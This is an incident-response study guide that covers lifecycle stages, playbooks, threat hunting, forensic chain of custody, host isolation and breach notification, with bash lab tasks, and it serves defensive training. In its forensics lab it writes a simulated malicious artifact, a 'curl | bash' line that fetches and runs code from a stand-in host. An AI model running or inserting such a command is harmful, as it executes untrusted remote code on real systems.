## Part A: The Incident Response Lifecycle (9 Stages)

| Stage | Core Objective & Key Actions |
| :--- | :--- |
| **1. Preparation** | Building IR plans, **playbooks**, communication trees, jump-bags (forensic USBs/write-blockers), SIEM/EDR telemetry, **security training**, and **tabletop/simulation exercises** *before* an incident occurs. |
| **2. Identification** | Detecting and triaging anomalous alerts (SIEM, EDR, IDS, user reports, **threat hunting**), validating true positives vs. false positives, and declaring an incident. |
| **3. Investigation** | Scoping the blast radius (which hosts, accounts, and data were touched), collecting volatile/non-volatile **digital forensics** evidence, and determining attacker TTPs. |
| **4. Containment** | Stopping the bleed and preventing lateral movement—**Short-Term** (immediate **network isolation** / **quarantine** of infected hosts) and **Long-Term** (re-segmenting VLANs, revoking compromised credentials). |
| **5. Negotiation** | Specialized executive, legal, and third-party incident negotiator communications (most commonly during **ransomware/extortion** incidents to assess threat actor demands, buy recovery time, and verify proof-of-life/decryption—while consulting legal/law enforcement regarding sanctions). |
| **6. Eradication** | Completely removing the adversary's foothold—deleting malware, webshells, rogue scheduled tasks/registry keys, closing exploited vulnerabilities, and resetting all compromised passwords/tokens. |
| **7. Recovery** | Safely restoring clean systems from verified immutable backups, rebuilding compromised hosts from golden images, reconnecting to production gradually, and intensifying monitoring for re-infection. |
| **8. Notification and Reporting** | Communicating incident status internally (**stakeholder notification**) and externally (**customer notification**, **law enforcement**, and **mandatory regulatory reporting** within legal deadlines). |
| **9. Post-Incident Activities** | Conducting **Lessons Learned** meetings, **Root Cause Analysis (RCA)**, updating IR playbooks/firewall rules, and publishing the formal **Post-Incident Report (PIR)**. |

## Part B: Preparation, Training & Exercises

### 1. Security Training, 2. Testing, 3. Tabletop Exercises, 4. Incident Response Playbooks, 5. Simulation & 6. Incident Response Roles
* **Concept:**
  * **Security Training:** Teaching general staff how to spot/report phishing and training SOC/IR responders on forensic tools and containment procedures.
  * **Testing & 5. Simulation:** Technical hands-on drills (e.g., red-team/purple-team attack simulations, live sandbox malware detonation, backup restoration drills) validating that tools and responders detect and contain real threats.
  * **Tabletop Exercises:** Discussion-based walk-throughs where leadership, legal, PR, and IT walk step-by-step through a realistic scenario (e.g., *"Ransomware hits the billing database at 2:00 AM"*) to uncover communication and policy gaps without touching live systems.
  * **Incident Response Playbooks:** Step-by-step, threat-specific checklists (Phishing Playbook, Ransomware Playbook, Compromised Cloud Key Playbook) defining exact triage, containment, and escalation actions.
  * **Incident Response Roles:** Clear command structure—**Incident Commander** (overall authority), **Lead Investigator / Forensics Analyst**, **Communications / PR Lead**, **Legal Counsel**, and **IT / Infrastructure Remediation Lead**.
* **Practical Task (Build a Structured Ransomware IR Playbook Template in Markdown):**
  ```bash
  cat << 'EOF' > ransomware_playbook.md
  # IR Playbook: Suspected Ransomware Execution
  1. **Identify:** Confirm mass file encryption / ransom note / `vssadmin delete shadows` alert.
  2. **Contain:** Isolate host via EDR immediately (DO NOT power off—preserve volatile RAM!).
  3. **Investigate:** Capture memory dump, identify initial access vector & compromised accounts.
  4. **Eradicate:** Wipe/reimage infected endpoints, patch entry vulnerability, reset KRBTGT/admin keys.
  5. **Recover:** Restore data from verified immutable offline backups; monitor closely for 30 days.
  EOF
  cat ransomware_playbook.md
  ```

## Part C: Detection, Threat Hunting & Advisories

### 7. Threat Detection, 8. Internal Advisories, 9. External Advisories & 10. Threat Hunting
* **Concept:**
  * **Threat Detection:** Automated alerting via SIEM correlation rules, EDR behavioral detections, IDS/IPS signatures, and DLP triggers.
  * **Internal Advisories:** Bulletins issued by the internal SOC/Security team warning employees and IT admins of active phishing campaigns, emergency maintenance, or internal policy updates.
  * **External Advisories:** Security bulletins published by vendors (Microsoft Patch Tuesday), CERTs/CSIRTs, CISA, or ISACs alerting organizations to newly disclosed zero-days or active threat campaigns.
  * **Threat Hunting:** **Proactive**, hypothesis-driven searching through logs, endpoint telemetry, and network flows to uncover stealthy adversaries (APTs) that evaded automated alerts.
* **Practical Task (Run a Proactive Threat Hunt for Persistence Mechanisms on Linux):**
  ```bash
  # Hypothesis: An attacker established persistence via unauthorized cron jobs or newly added SSH keys
  echo "[*] Hunting user crontabs and recent SSH authorized_keys..."
  crontab -l 2>/dev/null || echo "No user crontab found"
  find /home -name "authorized_keys" -ls 2>/dev/null
  ```

## Part D: Digital Forensics, Chain of Custody & Evidence Preservation

### 11. Digital Forensics, 12. Chain of Custody, 13. E-Discovery & 14. Evidence Preservation
* **Concept:**
  * **Digital Forensics:** Scientifically acquiring, preserving, analyzing, and presenting electronic evidence in a forensically sound, court-admissible manner.
  * **Order of Volatility (RFC 3227 — Collect Most Volatile First!):**
    1. CPU Registers & Cache $\rightarrow$ 2. **RAM (Volatile Memory)** & Network Sockets (`ss`/`netstat`) $\rightarrow$ 3. Swap / Paging File $\rightarrow$ 4. Hard Drives / SSDs (bit-stream forensic image) $\rightarrow$ 5. Remote Logs $\rightarrow$ 6. Archival Backups.
  * **Chain of Custody:** Chronological legal log documenting **who** collected, transferred, stored, or accessed a piece of evidence, **when** (UTC timestamps), **where**, and cryptographic **SHA-256 hashes** proving the evidence was never altered.
  * **E-Discovery (Electronic Discovery):** Identifying, preserving (**Litigation Hold**), collecting, and producing electronically stored information (emails, chat logs, documents) relevant to legal litigation or regulatory investigations.
  * **Evidence Preservation:** Protecting evidence from tampering or overwriting using **Hardware Write-Blockers**, creating bit-for-bit forensic disk images (`dd`), and verifying **SHA-256** integrity hashes before analysis (never analyze the original drive directly!).
* **Practical Task (Acquire a Forensic Artifact, Compute SHA-256 Hash & Log Chain of Custody):**
  ```bash
  mkdir -p ~/secplus_ir_lab/evidence_vault && cd ~/secplus_ir_lab

  # 1. Create a simulated malicious script artifact found on a compromised server
  echo "curl -s http://198.51.100 | bash" > suspicious_payload.sh

  # 2. Acquire forensic copy into Evidence Vault & generate cryptographic integrity hash
  cp -p suspicious_payload.sh evidence_vault/EVID-001_suspicious_payload.sh
  sha256sum evidence_vault/EVID-001_suspicious_payload.sh > evidence_vault/EVID-001.sha256

  # 3. Record Chain of Custody entry with UTC timestamp
  cat << EOF > evidence_vault/chain_of_custody.log
  Evidence ID   : EVID-001
  Collected By  : Ambe Fon (Incident Responder)
  Timestamp UTC : $(date -u +"%Y-%m-%dT%H:%M:%SZ")
  SHA-256 Hash  : $(awk '{print $1}' evidence_vault/EVID-001.sha256)
  Storage       : Read-Only Forensic Vault
  EOF

  cat evidence_vault/chain_of_custody.log
  ```

## Part E: Containment (Quarantine & Network Isolation)

### 15. Quarantine & 16. Network Isolation
* **Concept:**
  * **Quarantine:** Moving a suspicious file, malicious email attachment, or non-compliant endpoint into a restricted holding container/VLAN where it cannot execute or spread while awaiting analysis.
  * **Network Isolation:** Severing a compromised host's network connectivity (via EDR host-isolation API, disabling the switch port, moving to an isolated Quarantine VLAN, or applying strict host firewall rules) while keeping the machine powered on so memory forensics and EDR management channels remain intact.
* **Practical Task (Simulate Emergency Host Network Isolation via Host Firewall):**
  ```bash
  # Example Linux ufw isolation commands (allows ONLY SOC Forensic Server 10.10.99.5, blocks all else):
  echo "sudo ufw default deny incoming"
  echo "sudo ufw default deny outgoing"
  echo "sudo ufw allow from 10.10.99.5 to any port 22 proto tcp"
  ```

### 17. Stakeholder Notification, 18. Customer Notification, 19. Law Enforcement Notification & 20. Mandatory Reporting
* **Concept:** Coordinated internal and external breach communications governed by legal counsel, PR, and regulatory compliance timelines:

| Notification / Reporting Type | Target Audience & Purpose | Key Security+ Operational & Legal Rules |
| :--- | :--- | :--- |
| **17. Stakeholder Notification** | Internal executives, Board of Directors, Legal Counsel, HR, IT leads, and affected business unit owners. | Uses pre-approved **out-of-band communication channels** (phone/SMS/separate chat) in case corporate email is compromised. |
| **18. Customer Notification** | External clients, users, or patients whose PII, financial records, or PHI were exposed or compromised. | Must clearly explain what data was affected, what actions the company is taking, and protective steps for customers (password resets, credit monitoring). |
| **19. Law Enforcement Notification** | National cybercrime units, FBI/CISA, Interpol, or local police cybercrime divisions. | Essential during **ransomware extortion**, nation-state intrusions, wire fraud (BEC), or threats to critical infrastructure—helps track threat actors and verify sanctions compliance. |
| **20. Mandatory Reporting** | Government data protection authorities, financial/health regulators (e.g., **GDPR Supervisory Authorities**, **HIPAA / HHS**, **PCI-DSS card brands**, **SEC**). | Strictly enforced statutory deadlines—for example, **GDPR requires reporting within 72 hours** of becoming aware of a personal data breach. |

### 21. Lessons Learned, 22. Root Cause Analysis (RCA) & 23. Post-Incident Reports (PIR)
* **Concept:** Structured continuous-improvement activities conducted after containment, eradication, and recovery are complete:
  * **21. Lessons Learned:** A blameless post-incident review meeting involving SOC, IT, management, and legal teams held within days of closure to evaluate:
    * *What happened and when?*
    * *How effectively did people, processes, and tools perform?*
    * *Where did detection, containment, or communication lag?*
    * *What specific controls must be updated before the next incident?*
  * **22. Root Cause Analysis (RCA):** Deep engineering and forensic investigation identifying the **fundamental systemic flaw** that enabled the incident—going beyond surface symptoms (e.g., *"Malware ran on HR-PC-04"*) to uncover the true root cause (e.g., *"Phishing email bypassed gateway because DMARC was set to `p=none`, and macro execution was not blocked via Group Policy"*).
  * **23. Post-Incident Reports (PIR):** The formal, authoritative final record archived for executives, auditors, insurers, and legal counsel. Includes the **Executive Summary**, **Chronological Incident Timeline**, **Technical Root Cause Analysis**, **Scope of Impact**, **Notifications Sent**, **Financial/Operational Cost**, and **Tracked Remediation Action Items** with owners and due dates.
